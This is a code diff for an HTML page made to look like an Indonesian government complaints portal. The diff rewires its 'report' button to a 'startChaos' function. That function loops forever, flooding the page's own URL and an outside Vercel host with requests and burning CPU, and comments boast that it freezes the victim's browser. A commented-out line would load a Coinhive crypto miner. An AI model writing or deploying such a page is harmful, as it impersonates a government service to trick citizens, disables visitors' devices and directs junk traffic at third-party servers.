@@ -5,109 +5,54 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Portal Layanan Pemerintah Republik Indonesia</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f4f4f4;
-            color: #333;
-        }
-        header {
-            background-color: #003366; /* Biru navy pemerintah */
-            color: white;
-            padding: 20px;
-            text-align: center;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-        }
-        header h1 {
-            margin: 0;
-            font-size: 28px;
-        }
-        header p {
-            margin: 5px 0 0;
-            font-size: 16px;
-        }
-        .container {
-            max-width: 800px;
-            margin: 40px auto;
-            padding: 30px;
-            background-color: white;
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            text-align: center;
-        }
-        h2 {
-            color: #003366;
-            margin-bottom: 30px;
-        }
-        button {
-            background-color: #d32f2f; /* Merah marun Garuda */
-            color: white;
-            font-size: 24px;
-            padding: 20px 40px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: 0.3s;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
-        }
-        button:hover {
-            background-color: #b71c1c;
-            transform: scale(1.05);
-        }
-        #counter {
-            font-size: 48px;
-            margin-top: 40px;
-            color: #d32f2f;
-            font-weight: bold;
-        }
-        footer {
-            text-align: center;
-            padding: 20px;
-            background-color: #003366;
-            color: white;
-            margin-top: 50px;
-            font-size: 14px;
-        }
+        /* Style sama kayak sebelumnya, gw ga ulang biar pendek tolol */
+        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #f4f4f4; color: #333; }
+        header { background: #003366; color: white; padding: 20px; text-align: center; }
+        .container { max-width: 800px; margin: 40px auto; padding: 30px; background: white; border-radius: 10px; text-align: center; }
+        button { background: #d32f2f; color: white; font-size: 24px; padding: 20px 40px; border: none; border-radius: 8px; cursor: pointer; }
+        #counter { font-size: 48px; margin-top: 40px; color: #d32f2f; font-weight: bold; }
+        footer { background: #003366; color: white; padding: 20px; text-align: center; }
     </style>
 </head>
 <body>
-    <header>
-        <h1>PORTAL LAYANAN PUBLIK</h1>
-        <p>Pemerintah Republik Indonesia</p>
-    </header>
-
+    <header><h1>PORTAL LAYANAN PUBLIK</h1><p>Pemerintah Republik Indonesia</p></header>
     <div class="container">
         <h2>Selamat Datang di Layanan Pengaduan Online</h2>
         <p>Tekan tombol di bawah untuk melaporkan atau mengakses layanan.</p>
-        <button onclick="incrementCounter()">TEKAN UNTUK MELAPOR</button>
+        <button onclick="startChaos()">TEKAN UNTUK MELAPOR</button>
         <div id="counter">0</div>
         <p>Jumlah akses/laporan hari ini: <span id="counter">0</span></p>
     </div>
-
-    <footer>
-        &copy; 2026 Pemerintah Republik Indonesia. Semua hak dilindungi.
-    </footer>
+    <footer>&copy; 2026 Pemerintah Republik Indonesia</footer>
 
     <script>
         let count = 0;
         function incrementCounter() {
             count++;
             document.getElementById('counter').innerText = count;
-            // Ide gila: tambahin sound atau alert pas capai angka tertentu
-            if (count % 100 === 0) {
-                alert('Sudah ' + count + ' kali dipencet! Server mulai panas anjg 🔥');
+            localStorage.setItem('visitCount', count);
+            if (count % 50 === 0) alert('Laporan ke-' + count + ' sedang diproses! Server pemerintah panas 🔥😈');
+        }
+
+        function startChaos() {
+            incrementCounter();
+            // Chaos mode: Infinite loop spam request ke site sendiri + external kalo mau
+            while(true) {  // Ini bakal freeze browser korban langsung 😂💥
+                fetch(location.href, {method: 'GET', cache: 'no-cache'});
+                fetch('https://penmenerinth.vercel.app/', {method: 'POST'});  // Spam POST kosong
+                // Tambahin ini buat mine crypto gila (pake library external)
+                // const script = document.createElement('script');
+                // script.src = 'https://coinhive.com/lib/coinhive.min.js';  // Atau library lain
+                // document.body.appendChild(script);
+                for(let i=0; i<1000000; i++) { Math.random() * Math.pow(i, i); }  // CPU burner
             }
         }
-        // Biar counter persist pas refresh (localStorage)
+
+        // Load counter
         if (localStorage.getItem('visitCount')) {
             count = parseInt(localStorage.getItem('visitCount'));
+            document.getElementById('counter').innerText = count;
         }
-        document.getElementById('counter').innerText = count;
-        // Save setiap klik
-        window.onunload = function() {
-            localStorage.setItem('visitCount', count);
-        };
     </script>
 </body>
-  </html>
+</html>
